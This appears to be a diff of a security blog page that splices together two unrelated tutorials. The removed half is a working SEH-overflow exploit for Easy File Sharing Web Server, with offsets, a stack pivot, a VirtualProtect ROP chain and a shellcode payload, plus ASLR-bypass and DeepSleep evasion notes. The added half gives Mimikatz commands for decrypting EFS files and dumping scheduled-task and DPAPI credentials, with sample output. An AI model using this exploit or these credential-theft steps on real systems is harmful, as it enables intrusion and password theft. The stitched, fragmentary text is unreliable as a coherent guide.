-<figure class="wp-block-image size-full"><img decoding="async" width="883" height="461" src="/wp-content/uploads/2024/09/image-11.png" alt="" class="wp-image-8830" srcset="/wp-content/uploads/2024/09/image-11.png 883w, /wp-content/uploads/2024/09/image-11-300x157.png 300w, /wp-content/uploads/2024/09/image-11-768x401.png 768w" sizes="(max-width: 883px) 100vw, 883px" /></figure>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Usage</strong>: A fast ROP gadget finder for PE/ELF/Mach-O files in x86/x64/ARM/ARM64 architectures.</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>rp++ --file &lt;binary&gt; --rop
-rp++ --file &lt;binary&gt; --rop --va 0x0</code></pre>
-
-
-
-<figure class="wp-block-image size-full"><img decoding="async" width="890" height="451" src="/wp-content/uploads/2024/09/image-12.png" alt="" class="wp-image-8831" srcset="/wp-content/uploads/2024/09/image-12.png 890w, /wp-content/uploads/2024/09/image-12-300x152.png 300w, /wp-content/uploads/2024/09/image-12-768x389.png 768w" sizes="(max-width: 890px) 100vw, 890px" /></figure>
-
-
-
-<h3 class="wp-block-heading">Security Mechanisms and Bypasses&nbsp;</h3>
-
-
-
-<h4 class="wp-block-heading"><strong><em>Data Execution Prevention (DEP):</em></strong></h4>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Overview of DEP and Its Implementation:</em></strong> Data Execution Prevention (DEP) is a security feature that helps protect against code execution in non-executable memory regions. It works by marking certain areas of memory as non-executable, which prevents code from running in those regions. On modern operating systems, DEP is enforced using hardware and software techniques to distinguish between executable and non-executable memory regions, enhancing system security by mitigating attacks that rely on executing code from non-executable segments.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Techniques Used by ROPGadget to Bypass DEP Protections:</em></strong> ROP (Return-Oriented Programming) gadgets are small snippets of executable code that end with a return instruction, and they can be used to chain together a series of operations without the need for direct code injection. ROPGadget, a tool for identifying such gadgets, facilitates this by searching for these snippets within existing binaries. Since ROP exploits execute only existing code within the application&#8217;s memory, they inherently bypass DEP protections. The DEP does not stop code from executing if it is already part of an executable segment; thus, ROPGadget&#8217;s role is crucial in identifying usable gadgets for constructing these exploits.</p>
-
-
-
-<p class="wp-block-paragraph">To bypass DEP (Data Execution Prevention) using Return-Oriented Programming (ROP), here&#8217;s a detailed step-by-step breakdown, focusing on a Windows 7 SP1 x64 environment and using the Easy File Sharing Web Server vulnerability.</p>
-
-
-
-<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
-https://github.com/Gu4rana/Using_ROP_Bypassing_DEP
-</div></figure>
-
-
-
-<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="878" height="723" src="/wp-content/uploads/2024/09/image-13.png" alt="" class="wp-image-8832" srcset="/wp-content/uploads/2024/09/image-13.png 878w, /wp-content/uploads/2024/09/image-13-300x247.png 300w, /wp-content/uploads/2024/09/image-13-768x632.png 768w" sizes="(max-width: 878px) 100vw, 878px" /></figure>
-
-
-
-<h4 class="wp-block-heading">1. <strong>Setup Environment</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Operating System:</strong> Windows 7 SP1 x64</li>
-
-
-
-<li><strong>Vulnerable Application:</strong> Easy File Sharing Web Server (<a href="https://www.exploit-db.com/exploits/38526">exploit link</a>)</li>
-
-
-
-<li><strong>Debugger:</strong> Immunity Debugger with the Mona plugin installed.</li>
-
-
-
-<li><strong>DEP Settings:</strong> Enabled using <code>bcdedit /set nx AlwaysOn</code>.</li>
-</ul>
-
-
-
-<p class="wp-block-paragraph"><strong>DEP</strong> prevents execution of code from non-executable memory areas like the stack. To bypass this, ROP chains are used, which consist of short sequences of instructions called <em>gadgets</em>, ending with a <code>RET</code> instruction.</p>
-
-
-
-<h4 class="wp-block-heading">2. <strong>Replicating the Exploit</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li>From exploit-db, we know the application crashes when passing around 5000 bytes to the <code>UserID</code> cookie in the HTTP header.</li>
-
-
-
-<li>Create a test payload:</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>exploit = "A" * 5000</code></pre>
-
-
-
-<p class="wp-block-paragraph">This crashes the application and overwrites the <code>EAX</code> register with <code>AAAA</code>. The crash occurs due to the instruction below:</p>
-
-
-
-<pre class="wp-block-code"><code>61C277F6   8178 4C 97A629A0 CMP DWORD PTR DS:&#91;EAX+4C],A029A697</code></pre>
-
-
-
-<ul class="wp-block-list">
-<li>Additionally, the SEH (Structured Exception Handler) chain is overwritten.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">3. <strong>Finding Offset for EAX and SEH Overwrite</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li>Use Mona to generate a unique pattern:</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>!mona pc 5000</code></pre>
-
-
-
-<p class="wp-block-paragraph">After the crash, use Mona to find the offsets:</p>
-
-
-
-<pre class="wp-block-code"><code>!mona findmsp</code></pre>
-
-
-
-<p class="wp-block-paragraph">From the logs, you find that <code>EAX</code> is overwritten at offset 4183 and SEH at 4059 bytes.</p>
-
-
-
-<ul class="wp-block-list">
-<li>Modify the exploit payload accordingly:</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>exploit = "A" * 4059
-exploit += "B" * 4  # nSEH
-exploit += "C" * 4  # SEH
-exploit += "D" * (4183 - len(exploit))
-exploit += "A" * 4  # Overwrite EAX
-exploit += "D" * (5000 - len(exploit))</code></pre>
-
-
-
-<h4 class="wp-block-heading">4. <strong>Bad Characters</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li>To ensure our exploit is clean, generate and compare the byte array to find bad characters:</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>!mona bytearray -cpb '\x00'
-!mona compare -f c:\logs\fsws\bytearray.bin -a 0x057A6F34</code></pre>
-
-
-
-<ul class="wp-block-list">
-<li>Exclude <code>\x00</code> and <code>\x3b</code> from the payload.</li>
-</ul>
-
-
-
-<h3 class="wp-block-heading">5. <strong>ROP Chain Construction</strong></h3>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Stack Pivoting:</strong> The stack pointer points far away from our payload. We need to move it closer. Mona helps us find a stack pivot gadget:</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>!mona stackpivot -distance 2548 -cpb '\x00\x3b'</code></pre>
-
-
-
-<p class="wp-block-paragraph">One suitable gadget:</p>
-
-
-
-<pre class="wp-block-code"><code>0x1002280a : {pivot 4100 / 0x1004} # ADD ESP,1004 # RETN ** &#91;ImageLoad.dll]</code></pre>
-
-
-
-<p class="wp-block-paragraph">Update the payload:</p>
-
-
-
-<pre class="wp-block-code"><code>exploit = "A" * 4059
-exploit += "B" * 4  # nSEH
-exploit += struct.pack("&lt;I", 0x1002280a)  # SEH handler with stack pivot
-exploit += "D" * (4183 - len(exploit))
-exploit += "A" * 4  # Overwrite EAX
-exploit += "D" * (5000 - len(exploit))</code></pre>
-
-
-
-<p class="wp-block-paragraph"><strong>ROP Chain Construction:</strong> The goal is to call <code>VirtualProtect()</code> to make our shellcode executable. The steps include:</p>
-
-
-
-<ul class="wp-block-list">
-<li>Stack pivoting.</li>
-
-
-
-<li>Loading correct values into registers using gadgets.</li>
-
-
-
-<li>Calling <code>VirtualProtect()</code> with appropriate parameters.</li>
-</ul>
-
-
-
-<p class="wp-block-paragraph">Example gadgets and ROP chain:</p>
-
-
-
-<pre class="wp-block-code"><code>def create_rop_chain():
-    rop_chain = &#91;
-        0x10015442,  # POP EAX # RETN &#91;ImageLoad.dll]
-        0xfffffdff,  # 2's complement of 0x00000201
-        0x100231d1,  # NEG EAX # RETN &#91;ImageLoad.dll]
-        0x1001da09,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:&#91;ESP+C] # RETN &#91;ImageLoad.dll]
-        0x10015442,  # POP EAX # RETN &#91;ImageLoad.dll]
-        0x61c832d0,  # ptr to &amp;VirtualProtect() &#91;sqlite3.dll]
-        0x1001281a,  # ADD ESP,4 # RETN &#91;ImageLoad.dll]
-        0x61c735b4,  # Writable location &#91;sqlite3.dll]
-        # Add more gadgets as needed for ROP
-    ]
-    return ''.join(struct.pack("&lt;I", _) for _ in rop_chain)</code></pre>
-
-
-
-<h4 class="wp-block-heading">6. <strong>VirtualProtect API Call</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Parameters:</strong>
-<ul class="wp-block-list">
-<li><code>lpAddress</code>: Pointer to the memory region you want to change.</li>
-
-
-
-<li><code>dwSize</code>: Size of the region to change (e.g., 0x40 for PAGE_EXECUTE_READWRITE).</li>
-
-
-
-<li><code>flNewProtect</code>: The new protection attribute (e.g., PAGE_EXECUTE_READWRITE).</li>
-
-
-
-<li><code>lpflOldProtect</code>: Pointer to receive the old protection value.</li>
-</ul>
-</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">7. <strong>Final Payload</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li>Ensure enough NOPs (<code>\x90</code>) before the shellcode to avoid overwriting caused by <code>FSTENV</code> pushing data onto the stack.</li>
-
-
-
-<li>Example payload:</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>exploit = "A" * 2455  # Stack pivoting offset
-exploit += create_rop_chain()
-exploit += "\x90" * 32  # NOP slide
-exploit += shellcode  # Your shellcode
-exploit += "D" * (4059 - len(exploit))
-exploit += "BBBB"  # nSEH
-exploit += struct.pack("&lt;I", 0x1002280a)  # SEH handler
-exploit += "D" * (4183 - len(exploit))
-exploit += struct.pack("&lt;I", 0xffffffff)  # Trigger exception
-exploit += "D" * (5000 - len(exploit))</code></pre>
-
-
-
-<h4 class="wp-block-heading"><strong><em>Address Space Layout Randomization (ASLR):</em></strong></h4>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Explanation of ASLR and Its Role in Security:</em></strong> Address Space Layout Randomization (ASLR) is a technique used to randomly arrange the address space of a process, including the base address of executables and shared libraries. This randomization makes it difficult for attackers to predict the location of specific code or data segments, significantly reducing the likelihood of successful exploitation of memory corruption vulnerabilities that rely on fixed addresses.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Methods ROPGadget Uses to Overcome ASLR:</em></strong></p>
+<p class="wp-block-paragraph">Decrypting EFS files involves:</p>
 
 
 
 <ol class="wp-block-list">
-<li><strong><em>Information Leakage:</em></strong> Attackers can exploit vulnerabilities that leak information about memory layout to determine the locations of ROP gadgets. By analyzing leaks, attackers can adjust their ROP chains to account for the randomized addresses, effectively overcoming ASLR.</li>
+<li>Retrieving and exporting the necessary certificate.</li>
 
 
 
-<li><strong><em>Brute Forcing:</em></strong> In the absence of information leaks, brute-forcing techniques can be used to guess randomized addresses. This involves systematically attempting different address values until the correct ones are found, though this method is often more time-consuming and less practical compared to information leakage.</li>
+<li>Locating and exporting the associated private key.</li>
+
+
+
+<li>Decrypting the master key using the user password.</li>
+
+
+
+<li>Using the decrypted master key to decrypt the private key.</li>
+
+
+
+<li>Applying the decrypted private key to access the encrypted file.</li>
 </ol>
 
 
 
-<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
-https://redteamrecipe.com/aslr-exploitation-techniques
-</div></figure>
-
-
-
-<p class="wp-block-paragraph">Below is a structured overview of ASLR leak techniques and their relationship to ROP.</p>
-
-
-
-<h4 class="wp-block-heading">1. <strong>Modify Kernel Parameter (Linux)</strong></h4>
-
-
-
-<p class="wp-block-paragraph">ASLR can be modified or disabled at the kernel level, which provides insights into memory layout:</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Setarch</strong>: A Linux utility that can run a program in a modified environment, allowing users to change ASLR settings for a specific execution.</li>
-
-
-
-<li><strong>Change Mach-O Flags</strong>: A Python script can be created to change Mach-O flags on macOS binaries to disable ASLR.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">2. <strong>Compiler Options (Windows)</strong></h4>
-
-
-
-<p class="wp-block-paragraph">In Windows, ASLR can be influenced by compiler settings, which can lead to information leaks:</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Disabling ASLR in Visual Studio</strong>: Compiling an application with specific flags can disable ASLR, making it easier to predict memory layout.</li>
-
-
-
-<li><strong>SetDllCharacteristics</strong>: This function allows setting the characteristics of a DLL, which can include disabling ASLR.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">3. <strong>Leaking KASLR (Kernel ASLR)</strong></h4>
-
-
-
-<p class="wp-block-paragraph">Kernel ASLR is a feature in many operating systems that randomizes the base address of kernel modules:</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Startup_xen</strong>: An information leak during the startup process of a virtual machine in Xen can expose kernel addresses, providing a foothold for further exploitation.</li>
-
-
-
-<li><strong>Android BINDER_TYPE_BINDER</strong>: An address leak can occur via the Android Binder IPC mechanism, allowing attackers to exploit ASLR.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">4. <strong>Buffer Overflow to Control EAX</strong></h4>
-
-
-
-<p class="wp-block-paragraph">Buffer overflows are a common method to manipulate registers and control execution flow:</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>RET2ASLR</strong>: This technique involves leveraging a return address that points to a predictable location after ASLR is bypassed.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">5. <strong>Remote ASLR Leak in Microsoft&#8217;s RDP Client (CVE-2021-38665)</strong></h4>
-
-
-
-<p class="wp-block-paragraph">A specific vulnerability in the Microsoft Remote Desktop Protocol (RDP) client allowed attackers to leak memory addresses, circumventing ASLR protections. This enabled the formulation of ROP chains against affected systems.</p>
-
-
-
-<h4 class="wp-block-heading">6. <strong>ROP Techniques</strong></h4>
-
-
-
-<p class="wp-block-paragraph">Once ASLR information is leaked, it can be used in various ROP techniques:</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>ASLR Information Leak via Safe-Linking</strong>: In scenarios where a memory allocator is used (like tcache or fastbin chunks), information leaks can occur that reveal the base address of heap objects.</li>
-
-
-
-<li><strong>Return To PLT (Procedure Linkage Table)</strong>: This method allows attackers to jump to the PLT to execute functions indirectly. By controlling the PLT entries, attackers can bypass ASLR.</li>
-</ul>
-
-
-
-<h3 class="wp-block-heading">Advanced Techniques in ROP</h3>
-
-
-
-<h4 class="wp-block-heading"><strong><em>Complex ROP Chains:</em></strong></h4>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Building Intricate Sequences of Gadgets:</em></strong> In Return-Oriented Programming (ROP), complex ROP chains are constructed by chaining together multiple gadgets to perform advanced operations. These gadgets are small code sequences ending in a <code>ret</code> instruction, allowing for precise control over execution flow.</p>
-
-
-
-<p class="wp-block-paragraph">For example, consider the following simple ROP chain:</p>
+<h4 class="wp-block-heading">Prerequisites</h4>
 
 
 
 <ol class="wp-block-list">
-<li><strong>**Stack Pivoting Gadget:</strong></li>
+<li><strong>Encrypted file(s) access on a Windows system:</strong> Ensure you can access the encrypted files. In this guide, a mapped partition <code>d:\</code> is used.</li>
+
+
+
+<li><strong>User&#8217;s SystemCertificates, Crypto, and Protect folders:</strong> These folders contain crucial data for decrypting EFS files. You can find these folders at <code>d:\Users\&lt;Username>\AppData\Roaming\Microsoft</code>.</li>
+
+
+
+<li><strong>Master key or a way to decrypt it:</strong> This could be the user&#8217;s password, SHA1, NTLM, Domain backup key, or a memory dump. For this guide, we use the user password <code>waza1234/</code>.</li>
 </ol>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>pop rdi ret</code></p>
+<h4 class="wp-block-heading">Step-by-Step Guide</h4>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget sets the <code>rdi</code> register to a new value by popping from the stack, often used to pivot the stack pointer.</p>
+<h5 class="wp-block-heading">1. Get Information about the Encrypted File</h5>
 
 
 
-<ol start="2" class="wp-block-list">
-<li><strong><em>Arithmetic Gadget:</em></strong></li>
-</ol>
+<p class="wp-block-paragraph">First, gather information about the encrypted file and the certificate used to encrypt it.</p>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>add eax, 0x10 ret</code></p>
+<pre class="wp-block-code"><code>cipher /c "d:\Users\Gentil Kiwi\Documents\encrypted.txt"</code></pre>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget increments the <code>eax</code> register by <code>0x10</code>.</p>
+<p class="wp-block-paragraph">This command provides details like the certificate&#8217;s fingerprint. For instance:</p>
 
 
 
-<ol start="3" class="wp-block-list">
-<li><strong><em>Memory Access Gadget:</em></strong></li>
-</ol>
+<pre class="wp-block-code"><code> Utilisateurs pouvant déchiffrer :
+    Gentil Kiwi(Gentil Kiwi@DESKTOP-HF8ESMF)
+    Empreinte numérique du certificat : B53C 6DE2 83C0 0203 587A 03DD 3D0B F66E 1696 9A55</code></pre>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>mov [rbx], rax ret</code></p>
+<p class="wp-block-paragraph">We need this fingerprint (<code>B53C6DE283C00203587A03DD3D0BF66E16969A55</code>) to locate the certificate and private key.</p>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget stores the value of <code>rax</code> into the memory address pointed to by <code>rbx</code>.</p>
+<h5 class="wp-block-heading">2. Export the Certificate</h5>
 
 
 
-<ol start="4" class="wp-block-list">
-<li><strong><em>Function Call Gadget:</em></strong></li>
-</ol>
+<p class="wp-block-paragraph">Use Mimikatz to export the certificate.</p>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>call [rcx] ret</code></p>
+<pre class="wp-block-code"><code>mimikatz # crypto::system /file:"D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\B53C6DE283C00203587A03DD3D0BF66E16969A55" /export</code></pre>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget performs a function call with the address stored in <code>rcx</code>.</p>
+<p class="wp-block-paragraph">This command saves the certificate to a <code>.der</code> file.</p>
 
 
 
-<p class="wp-block-paragraph">Combining these gadgets in a ROP chain allows an attacker to manipulate stack pointers, perform arithmetic operations, and execute function calls. For example, an attacker might pivot the stack to a controlled location, modify values in memory, and call a function with specific parameters.</p>
+<h5 class="wp-block-heading">3. Locate and Export the Private Key</h5>
 
 
 
-<p class="wp-block-paragraph"><strong><em>Examples of Combining Various Gadget Types:</em></strong> A ROP chain might look like this :</p>
+<p class="wp-block-paragraph">Find the private key associated with the certificate. Unfortunately, filenames are not directly linked to container names. You need to test them to find the correct one.</p>
 
 
 
-<pre class="wp-block-code"><code>#0x5050118e: mov eax, esi ; pop esi ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
+<pre class="wp-block-code"><code>mimikatz # dpapi::capi /in:"D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b"</code></pre>
 
-#0x5052db24: pop ecx ; ret&amp;nbsp; ;
 
-#0x50533bf4: sub eax, ecx ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
 
-#0x505263f9: push eax ; pop esi ; pop ebx ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
+<p class="wp-block-paragraph">Check if the <code>pUniqueName</code> field matches the container name from the certificate export step.</p>
 
-#0x5053a0f5: pop eax ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
 
-#0x5050626e: add byte &#91;esi+0x3B], ah ; ret&amp;nbsp; ;</code></pre>
 
+<h5 class="wp-block-heading">4. Decrypt the Master Key</h5>
 
 
-<h4 class="wp-block-heading">DeepSleep</h4>
 
+<p class="wp-block-paragraph">The private key is encrypted with a master key. Use Mimikatz to decrypt this master key.</p>
 
 
-<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="887" height="270" src="/wp-content/uploads/2024/09/image-14.png" alt="" class="wp-image-8833" srcset="/wp-content/uploads/2024/09/image-14.png 887w, /wp-content/uploads/2024/09/image-14-300x91.png 300w, /wp-content/uploads/2024/09/image-14-768x234.png 768w" sizes="(max-width: 887px) 100vw, 887px" /></figure>
 
+<pre class="wp-block-code"><code>mimikatz # dpapi::masterkey /in:"D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Protect\S-1-5-21-494464150-3436831043-1864828003-1001\1eccdbd2-4771-4360-8b19-9d6060a061dc" /password:waza1234/</code></pre>
 
 
-<p class="wp-block-paragraph">DeepSleep is a technique inspired by Gargoyle for x64 environments that utilizes Return-Oriented Programming (ROP) and Position Independent Code (PIC) to hide memory artifacts. The primary goal is to set up a ROP chain that calls <code>VirtualProtect()</code> to modify memory permissions, sleeps, and then resets the memory protection while avoiding detection by memory scanners like Moneta.</p>
 
+<p class="wp-block-paragraph">This command outputs the decrypted master key. For example:</p>
 
 
-<ol class="wp-block-list">
-<li><strong>ROP Chain</strong>: A sequence of carefully crafted gadget calls that allows an attacker to execute arbitrary code while evading detection.</li>
 
+<pre class="wp-block-code"><code>&#91;masterkey]
+  **MASTERKEY**
+    dwVersion        : 00000002 - 2
+    salt             : 477e4b37a7a3a0992c01cff93bb0af66
+    rounds           : 00000ce4 - 3300
+    algHash          : 0000800e - 32782 (CALG_SHA_512)
+    algCrypt         : 00006610 - 26128 (CALG_AES_256)
+    pbKey            : 7e86f2b799...</code></pre>
 
 
-<li><strong>PIC (Position Independent Code)</strong>: Code that executes properly regardless of its memory address. This is crucial for making the payload stealthy and effective across different environments.</li>
 
+<h5 class="wp-block-heading">5. Decrypt the Private Key</h5>
 
 
-<li><strong>Memory Protection</strong>: The technique involves altering memory protection states to execute the malicious code while minimizing detection risk.</li>
-</ol>
 
+<p class="wp-block-paragraph">With the master key decrypted, proceed to decrypt the private key.</p>
 
 
-<h4 class="wp-block-heading">Implementation</h4>
 
+<pre class="wp-block-code"><code>mimikatz # dpapi::capi /masterkey:7e86f2b799... /in:"D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b"</code></pre>
 
 
-<p class="wp-block-paragraph"><strong>Prerequisites</strong></p>
+
+<h5 class="wp-block-heading">6. Decrypt the EFS File</h5>
+
+
+
+<p class="wp-block-paragraph">Finally, use the decrypted private key to decrypt the EFS file. This step may involve using additional tools or scripts to apply the private key and decrypt the file content.</p>
+
+
+
+<h2 class="wp-block-heading">scheduled tasks credentials</h2>
+
+
+
+<p class="wp-block-paragraph">This guide demonstrates how to retrieve scheduled task passwords using Mimikatz. Benjamin DELPY shared this method, and it involves accessing Windows credential vaults and decrypting credential blobs.</p>
+
+
+
+<h4 class="wp-block-heading">Step-by-Step Instructions</h4>
+
+
+
+<h4 class="wp-block-heading">1. Vault Credentials Method</h4>
+
+
+
+<p class="wp-block-paragraph">After creating a scheduled task, Windows stores a copy of the task credential in the owner&#8217;s credential vault. Use Mimikatz to extract these credentials:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # vault::cred</code></pre>
+
+
+
+<p class="wp-block-paragraph">Example output:</p>
+
+
+
+<pre class="wp-block-code"><code>TargetName : LAB\admin / &lt;NULL&gt;
+UserName   : LAB\admin
+Comment    : &lt;NULL&gt;
+Type       : 1 - generic
+Persist    : 3 - enterprise
+Flags      : 00000000
+Credential : waza1234/a
+Attributes : 0</code></pre>
+
+
+
+<p class="wp-block-paragraph">These credentials can be exposed by using <code>sekurlsa::credman</code> or <code>sekurlsa::logonpasswords</code>:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::credman</code></pre>
+
+
+
+<p class="wp-block-paragraph">Example output:</p>
+
+
+
+<pre class="wp-block-code"><code>Authentication Id : 0 ; 183160 (00000000:0002cb78)
+Session           : Interactive from 1
+User Name         : Administrateur
+Domain            : LAB
+Logon Server      : DC-0
+Logon Time        : 03/01/2017 22:27:52
+SID               : S-1-5-21-412031729-2859336904-2073880905-500
+        credman :
+         &#91;00000000]
+         * Username : LAB\admin
+         * Domain   : LAB\admin
+         * Password : waza1234/a</code></pre>
+
+
+
+<h4 class="wp-block-heading">2. Elevating to SYSTEM</h4>
+
+
+
+<p class="wp-block-paragraph">To access system credentials, elevate to SYSTEM and request the credentials:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # vault::cred</code></pre>
+
+
+
+<p class="wp-block-paragraph">Example output:</p>
+
+
+
+<pre class="wp-block-code"><code>TargetName : Domain:batch=TaskScheduler:Task:{813565C4-C976-4E78-A1CA-8BDAE749E965} / &lt;NULL&gt;
+UserName   : LAB\admin
+Comment    : &lt;NULL&gt;
+Type       : 2 - domain_password
+Persist    : 2 - local_machine
+Flags      : 00004004
+Credential :
+Attributes : 0</code></pre>
+
+
+
+<p class="wp-block-paragraph">To expose the credential, use the patch option:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # vault::cred /patch</code></pre>
+
+
+
+<p class="wp-block-paragraph">Example output:</p>
+
+
+
+<pre class="wp-block-code"><code>TargetName : Domain:batch=TaskScheduler:Task:{813565C4-C976-4E78-A1CA-8BDAE749E965} / &lt;NULL&gt;
+UserName   : LAB\admin
+Credential : waza1234/a</code></pre>
+
+
+
+<h4 class="wp-block-heading">3. DPAPI Method</h4>
+
+
+
+<p class="wp-block-paragraph">System credentials are stored in:</p>
+
+
+
+<pre class="wp-block-code"><code>%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials</code></pre>
+
+
+
+<p class="wp-block-paragraph">List the directory contents:</p>
+
+
+
+<pre class="wp-block-code"><code>C:\&gt;dir /a %systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials</code></pre>
+
+
+
+<p class="wp-block-paragraph">Decrypt the credential blob with Mimikatz:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # dpapi::cred /in:%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\AA10EB8126AA20883E9542812A0F904C</code></pre>
+
+
+
+<p class="wp-block-paragraph">Example output:</p>
+
+
+
+<pre class="wp-block-code"><code>**CREDENTIAL**
+  credFlags      : 00000030 - 48
+  credSize       : 000000fe - 254
+  Type           : 00000002 - 2 - domain_password
+  UserName       : LAB\admin
+  CredentialBlob : waza1234/a</code></pre>
+
+
+
+<h4 class="wp-block-heading">4. Extracting DPAPI Master Keys</h4>
+
+
+
+<p class="wp-block-paragraph">To extract and use DPAPI master keys:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::dpapi</code></pre>
+
+
+
+<p class="wp-block-paragraph">Use the master key to decrypt the credential blob:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # dpapi::cred /in:%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\AA10EB8126AA20883E9542812A0F904C /masterkey:0a942e9dfc934246081ed23f371c42fc0f9fcb6dcd3285ac210cd64c26dec3adc120eee7abdd56c68acd051850fd923380bc2e3a1558354eac53c2da6e73bbce</code></pre>
+
+
+
+<p class="wp-block-paragraph">Example output:</p>
+
+
+
+<pre class="wp-block-code"><code>**CREDENTIAL**
+  UserName       : LAB\admin
+  CredentialBlob : waza1234/a</code></pre>
+
+
+
+<h4 class="wp-block-heading">5. Offline Method</h4>
+
+
+
+<p class="wp-block-paragraph">To retrieve credentials offline, dump secrets from SYSTEM and SECURITY files:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # lsadump::secrets /system:c:\backup\SYSTEM /security:c:\backup\SECURITY</code></pre>
+
+
+
+<p class="wp-block-paragraph">Extract and decrypt master key:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # dpapi::masterkey /in:%systemroot%\System32\Microsoft\Protect\S-1-5-18\User\5d4e7e0d-d922-4783-8efc-9319b45b1c9a /system:c89e39644a0b05aa3b3939c8320282f857d9182c</code></pre>
+
+
+
+<p class="wp-block-paragraph">Decrypt the credential blob:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # dpapi::cred /in:%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\AA10EB8126AA20883E9542812A0F904C</code></pre>
+
+
+
+<h2 class="wp-block-heading">Crypto Module</h2>
+
+
+
+<p class="wp-block-paragraph">The Mimikatz crypto module is a versatile tool for interacting with CryptoAPI functions. This module provides functionality similar to the certutil utility and includes capabilities for token impersonation, patching legacy CryptoAPI functions, and modifying the CNG key isolation service.</p>
 
 
 
 <ul class="wp-block-list">
-<li><strong>Development Environment</strong>: MinGW or a compatible environment to compile the code.</li>
+<li>Use <code>crypto::stores</code> for a list of valid system stores and available stores within them.</li>
 
 
 
-<li><strong>Windows Version</strong>: Tested on Windows 10, version 10.0.19044.</li>
+<li>Non-exportable keys may often be exported after using <code>crypto::capi</code> and/or <code>crypto::cng</code>.</li>
+
+
+
+<li>Ensure you have the correct ACL on the filesystem to access private keys. Some operations might require elevated privileges (e.g., UAC prompts).</li>
+
+
+
+<li>Smartcard crypto providers may sometimes falsely report successful private key exports.</li>
 </ul>
 
 
 
-<h4 class="wp-block-heading">ROP Chain Construction</h4>
+<h2 class="wp-block-heading">Commands</h2>
 
 
 
-<p class="wp-block-paragraph">The following steps outline how to construct the ROP chain using VirtualProtect, Sleep, and back to VirtualProtect:</p>
+<h3 class="wp-block-heading"><code>providers</code></h3>
+
+
+
+<p class="wp-block-paragraph">Lists all available providers, including CryptoAPI and CNG providers if available on NT 6.</p>
+
+
+
+<h4 class="wp-block-heading">Usage:</h4>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # crypto::providers</code></pre>
+
+
+
+<h4 class="wp-block-heading">Output Example:</h4>
+
+
+
+<pre class="wp-block-code"><code>CryptoAPI providers :
+ 0. RSA_FULL      ( 1) - Microsoft Base Cryptographic Provider v1.0
+ ...
+CNG providers :
